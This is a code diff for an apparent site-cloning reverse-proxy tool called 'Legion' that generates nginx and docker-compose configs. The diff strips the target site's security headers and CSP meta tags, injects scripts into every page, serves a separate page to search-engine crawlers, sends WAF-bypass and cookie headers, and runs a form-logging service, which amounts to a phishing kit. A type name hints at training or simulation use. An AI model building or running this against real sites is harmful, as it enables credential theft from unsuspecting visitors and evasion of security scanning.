@@ -3,12 +3,15 @@
  * All features are opt-in via CLI flags; disabled by default.
  */
 import {
+  buildMirrorStaticAssetLocation,
   buildProductionAssetRewriteFilters,
+  buildProductionCloakLocationGuard,
   buildProductionCloakServerBlock,
   buildProductionInjectTags,
   buildSubdomainProxyLocation,
   NGINX_PRODUCTION_CLOAK_MAPS,
 } from './mirror-production.js'
+import { parseQaVisibleUiEnv } from './mirror-god-mode.js'
 
 export type TrainingCloneFeatures = {
   proxy: boolean
@@ -99,7 +102,24 @@ export const NGINX_PROXY_UPGRADE_AND_STRIP_HEADERS = `
       proxy_set_header Upgrade $http_upgrade;
       proxy_set_header Connection $connection_upgrade;
       proxy_hide_header Content-Security-Policy;
-      proxy_hide_header X-Frame-Options;`
+      proxy_hide_header Content-Security-Policy-Report-Only;
+      proxy_hide_header X-Frame-Options;
+      proxy_hide_header X-Content-Type-Options;
+      proxy_hide_header Cross-Origin-Embedder-Policy;
+      proxy_hide_header Cross-Origin-Opener-Policy;
+      proxy_hide_header Cross-Origin-Resource-Policy;
+      proxy_hide_header Permissions-Policy;`
+
+export const NGINX_MIRROR_PERFORMANCE_BLOCK = `
+  resolver 1.1.1.1 8.8.8.8 valid=60s ipv6=off;
+  proxy_cache_path /var/cache/nginx/legion levels=1:2 keys_zone=legion_static:32m max_size=512m inactive=24h use_temp_path=off;
+  gzip on;
+  gzip_vary on;
+  gzip_proxied any;
+  gzip_comp_level 5;
+  gzip_min_length 256;
+  gzip_types text/css text/javascript application/javascript application/json application/wasm text/plain text/xml image/svg+xml font/woff font/woff2 application/font-woff application/vnd.ms-fontobject;
+`
 
 function buildMirrorHtmlInjectTags(opts: {
   solveCaptcha?: boolean
@@ -110,7 +130,7 @@ function buildMirrorHtmlInjectTags(opts: {
   productionClone?: boolean
 }): string {
   if (opts.productionClone) {
-    return buildProductionInjectTags()
+    return buildProductionInjectTags({ qaVisible: parseQaVisibleUiEnv() })
   }
   const tags: string[] = []
   if (opts.headlessFallback) {
@@ -131,6 +151,146 @@ function buildMirrorHtmlInjectTags(opts: {
     tags.push('<script src="/legion-mobile-optimize.js" defer></script>')
   }
   return tags.join('')
+}
+
+/** Liveness probe — orchestrator checks this before publishing tunnel URL. */
+export const MIRROR_HEALTH_NGINX_BLOCK = `
+    location = /mirror-health {
+      access_log off;
+      default_type text/plain;
+      return 200 'ok';
+      add_header Cache-Control "no-store";
+    }
+`
+
+export type NginxValidationResult = {
+  ok: boolean
+  config: string
+  warnings: string[]
+  errors: string[]
+  usedFallback: boolean
+}
+
+/** Remove duplicate sub_filter_once directives (nginx crashes on duplicates in one location). */
+export function sanitizeNginxConfig(config: string): string {
+  let subFilterOnceSeen = false
+  return config
+    .split(/\r?\n/)
+    .filter((line) => {
+      if (!/^\s*sub_filter_once\s+/i.test(line)) return true
+      if (subFilterOnceSeen) {
+        console.error('[nginx] Removed duplicate sub_filter_once directive')
+        return false
+      }
+      subFilterOnceSeen = true
+      return true
+    })
+    .join('\n')
+}
+
+export function validateNginxConfigInMemory(config: string): {
+  ok: boolean
+  warnings: string[]
+  errors: string[]
+} {
+  const warnings: string[] = []
+  const errors: string[] = []
+
+  const subFilterOnceMatches = config.match(/^\s*sub_filter_once\s+/gim) ?? []
+  if (subFilterOnceMatches.length > 1) {
+    warnings.push(`multiple sub_filter_once (${subFilterOnceMatches.length}) — sanitize before deploy`)
+  }
+
+  for (const match of config.matchAll(/proxy_pass\s+([^;]+);/g)) {
+    const target = match[1]?.trim() ?? ''
+    if (!target || target.includes('undefined') || target.includes('null')) {
+      errors.push(`invalid proxy_pass target: ${target}`)
+    }
+    if (/^https?:\/\/[^/\s]+$/.test(target) && !target.includes('.')) {
+      warnings.push(`proxy_pass host may be incomplete: ${target}`)
+    }
+  }
+
+  const openBraces = (config.match(/\{/g) ?? []).length
+  const closeBraces = (config.match(/\}/g) ?? []).length
+  if (openBraces !== closeBraces) {
+    errors.push(`unbalanced braces: ${openBraces} open vs ${closeBraces} close`)
+  }
+
+  if (!/listen\s+\d+/i.test(config)) {
+    warnings.push('no listen directive found')
+  }
+
+  return { ok: errors.length === 0, warnings, errors }
+}
+
+export function buildMinimalSafeMirrorNginxConfig(
+  listenPort: number,
+  origin: string,
+  host: string,
+  upstreamScheme: string,
+): string {
+  return `# Legion mirror — minimal safe fallback (no sub_filter)
+worker_processes 1;
+events { worker_connections 1024; }
+http {
+  include /etc/nginx/mime.types;
+  default_type application/octet-stream;
+  server {
+    listen ${listenPort};
+    server_name localhost;
+    root /usr/share/nginx/html;
+${MIRROR_HEALTH_NGINX_BLOCK}
+    location ^~ /legion- {
+      try_files $uri =404;
+      add_header Cache-Control "no-store";
+    }
+    location / {
+      proxy_pass ${upstreamScheme}://${host};
+      proxy_ssl_server_name on;
+      proxy_set_header Host ${host};
+      proxy_set_header X-Real-IP $remote_addr;
+      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_set_header X-Forwarded-Proto $scheme;
+      proxy_set_header Accept-Encoding "";
+    }
+  }
+}
+`
+}
+
+export function finalizeMirrorNginxConfig(
+  raw: string,
+  fallback: () => string,
+): NginxValidationResult {
+  let config = sanitizeNginxConfig(raw)
+  let validation = validateNginxConfigInMemory(config)
+  if (!validation.ok) {
+    console.error(
+      `[nginx] Validation failed (${validation.errors.join('; ')}) — using minimal safe template`,
+    )
+    config = sanitizeNginxConfig(fallback())
+    validation = validateNginxConfigInMemory(config)
+    return {
+      ok: validation.ok,
+      config,
+      warnings: validation.warnings,
+      errors: validation.errors,
+      usedFallback: true,
+    }
+  }
+  if (validation.warnings.length > 0) {
+    for (const w of validation.warnings) {
+      console.error(`[nginx] WARN: ${w}`)
+    }
+  }
+  return {
+    ok: true,
+    config,
+    warnings: validation.warnings,
+    errors: [],
+    usedFallback: false,
+  }
 }
 
 export function buildNginxProxyConfig(target: URL, listenPort = 8080): string {
@@ -175,7 +335,7 @@ ${NGINX_PROXY_WEBSOCKET_MAP}
     location = /bots.html {
       internal;
     }
-
+${MIRROR_HEALTH_NGINX_BLOCK}
     # Bot simulation — informational page for crawlers (when --cloak used with proxy)
     error_page 418 = /bots.html;
     if ($is_bot_ua) { return 418; }
@@ -268,6 +428,7 @@ export function buildMirrorNginxConfig(
   const experimental = opts?.experimental === true
   const cloak = opts?.cloak === true || opts?.productionClone === true
   const productionClone = opts?.productionClone === true
+  const useProductionCloak = productionClone || process.env['MIRROR_CLOAK_MODE'] === 'dual'
   const loggerHost = opts?.loggerHost ?? 'form-logger'
   const loggerPort = opts?.loggerPort ?? 9090
   const injectTags = buildMirrorHtmlInjectTags({
@@ -342,8 +503,14 @@ export function buildMirrorNginxConfig(
 
   const htmlInjectSubFilter = hasHtmlInject
     ? `
-      sub_filter '</body>' '${injectTags}</body>';
+      sub_filter '</head>' '${injectTags}</head>';
       proxy_set_header Accept-Encoding "";`
+    : ''
+
+  const cspMetaStripSubFilter = needsSubFilter
+    ? `
+      sub_filter 'http-equiv="Content-Security-Policy"' 'http-equiv="X-Legion-Csp-Removed"';
+      sub_filter "http-equiv='Content-Security-Policy'" "http-equiv='X-Legion-Csp-Removed'";`
     : ''
 
   const assetRewriteSubFilter =
@@ -362,7 +529,7 @@ export function buildMirrorNginxConfig(
       sub_filter_types ${subFilterTypes};`
     : ''
 
-  const subdomainProxyBlock = productionClone
+  const subdomainProxyBlock = productionClone || assetRewrite
     ? buildSubdomainProxyLocation(upstreamScheme)
     : ''
 
@@ -398,8 +565,8 @@ http {
   proxy_connect_timeout 60s;
   proxy_send_timeout 120s;
   proxy_read_timeout 120s;
-  proxy_buffering on;
-${NGINX_PROXY_WEBSOCKET_MAP}${formLogBlock}${productionClone ? NGINX_PRODUCTION_CLOAK_MAPS : cloak ? `
+  proxy_buffering off;
+${NGINX_MIRROR_PERFORMANCE_BLOCK}${NGINX_PROXY_WEBSOCKET_MAP}${formLogBlock}${useProductionCloak ? NGINX_PRODUCTION_CLOAK_MAPS : cloak ? `
   map $http_user_agent $is_bot_ua {
     default 0;
     ~*googlebot 1;
@@ -418,7 +585,7 @@ ${NGINX_PROXY_WEBSOCKET_MAP}${formLogBlock}${productionClone ? NGINX_PRODUCTION_
     server_name localhost 127.0.0.1;
 
     root /usr/share/nginx/html;
-${productionClone ? buildProductionCloakServerBlock() : cloak ? `
+${useProductionCloak ? buildProductionCloakServerBlock() : cloak ? `
     location = /bots.html {
       try_files /bots.html =404;
     }
@@ -431,15 +598,16 @@ ${productionClone ? buildProductionCloakServerBlock() : cloak ? `
       add_header Cache-Control "no-store";
       add_header Content-Type application/json;
     }
-
+${MIRROR_HEALTH_NGINX_BLOCK}
     # Legion inject assets — serve from local volume (never proxy to upstream)
     location ^~ /legion- {
       try_files $uri =404;
       add_header Cache-Control "no-store";
     }
-${subdomainProxyBlock}${formLogServerBlock}${captchaServerBlock}
+${subdomainProxyBlock}${formLogServerBlock}${captchaServerBlock}${productionClone || assetRewrite ? buildMirrorStaticAssetLocation(upstreamScheme, host, wafBypassHeaders, proxyCookieHeader) : ''}
     # Proxy all paths (including /) to the configured target origin
-    location / {${mirrorDirectives}${subFilterDirectiveHeader}${htmlInjectSubFilter}${assetRewriteSubFilter}
+    location / {${useProductionCloak ? buildProductionCloakLocationGuard() : ''}${mirrorDirectives}${subFilterDirectiveHeader}${htmlInjectSubFilter}${cspMetaStripSubFilter}${assetRewriteSubFilter}
+      proxy_buffering off;
       proxy_pass ${upstreamScheme}://${host};
       proxy_ssl_server_name on;
       proxy_set_header Host ${host};
@@ -556,9 +724,11 @@ ${loggerVolumes}
     ? `      - ./:/usr/share/nginx/html:ro
       - ./nginx.conf:/etc/nginx/nginx.conf:ro
       - ./rotate:/etc/nginx/rotate:ro
-      - ./ssl:/etc/nginx/ssl:ro`
+      - ./ssl:/etc/nginx/ssl:ro
+      - legion-nginx-cache:/var/cache/nginx`
     : `      - ./:/usr/share/nginx/html:ro
-      - ./nginx.conf:/etc/nginx/nginx.conf:ro`
+      - ./nginx.conf:/etc/nginx/nginx.conf:ro
+      - legion-nginx-cache:/var/cache/nginx`
 
   const rotatorService = autoRotate
     ? `
@@ -606,7 +776,10 @@ ${mirrorPorts}
     volumes:
 ${mirrorVolumes}
     restart: unless-stopped
-${mirrorDepends}${loggerService}${rotatorService}`
+${mirrorDepends}${loggerService}${rotatorService}
+volumes:
+  legion-nginx-cache:
+`
 }
 
 /** DuckDNS-safe slug from target hostname. */
